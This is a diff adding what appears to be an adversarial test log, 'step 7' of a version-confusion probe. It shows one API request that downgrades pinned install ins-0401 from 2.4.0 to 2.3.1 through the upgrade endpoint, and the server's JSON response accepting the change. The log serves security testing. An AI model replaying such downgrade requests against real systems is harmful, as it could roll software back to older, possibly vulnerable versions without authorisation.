@@ -1,0 +1,72 @@
+adv-version-confusion step 7 — IMPLICIT DOWNGRADE of a pinned instance through the UPGRADE operation
+(browser surface: the upgrade form is withdrawn when up-to-date, so the UI does not offer a downgrade;
+ the documented API twin POST /api/installs/upgrade — same op code install:manage — carries the attack)
+
+== 7a. upgrade op targeting the OLDER version 2.3.1 while ins-0401 is pinned at 2.4.0 ==
+POST /api/installs/upgrade {"installId":"ins-0401","targetVersion":"2.3.1","expectedCurrentVersion":"2.4.0"} as petra.voss
+{
+  "ok": true,
+  "message": "Install ins-0401 upgraded 2.4.0 → 2.3.1.",
+  "warning": null,
+  "redirect": "/installs",
+  "install": {
+    "id": "ins-0401",
+    "orgId": "o-2",
+    "packageId": "pk-102",
+    "version": "2.3.1",
+    "status": "active",
+    "config": {
+      "queue": "tier-1",
+      "confidenceThreshold": "0.7",
+      "targetVersion": "2.3.1",
+      "version": "2.3.1",
+      "digest": "sha256:04cf049e110cc2cc"
+    },
+    "installedById": "u-6",
+    "installedAt": "2026-08-31T10:00:00Z",
+    "entitlementId": "ent-0501",
+    "history": [
+      {
+        "action": "installed",
+        "fromVersion": null,
+        "toVersion": "2.3.1",
+        "at": "2026-08-31T10:00:00Z",
+        "byId": "u-6"
+      },
+      {
+        "action": "configured",
+        "fromVersion": "2.3.1",
+        "toVersion": "2.3.1",
+        "at": "2026-09-12T09:29:56.017Z",
+        "byId": "u-6",
+        "configKeys": []
+      },
+      {
+        "action": "configured",
+        "fromVersion": "2.3.1",
+        "toVersion": "2.3.1",
+        "at": "2026-09-12T09:30:13.979Z",
+        "byId": "u-6",
+        "configKeys": [
+          "targetVersion",
+          "version",
+          "digest"
+        ]
+      },
+      {
+        "action": "upgraded",
+        "fromVersion": "2.3.1",
+        "toVersion": "2.4.0",
+        "at": "2026-09-12T09:30:59.598Z",
+        "byId": "u-6"
+      },
+      {
+        "action": "upgraded",
+        "fromVersion": "2.4.0",
+        "toVersion": "2.3.1",
+        "at": "2026-09-12T09:31:24.836Z",
+        "byId": "u-6"
+      }
+    ]
+  }
+}
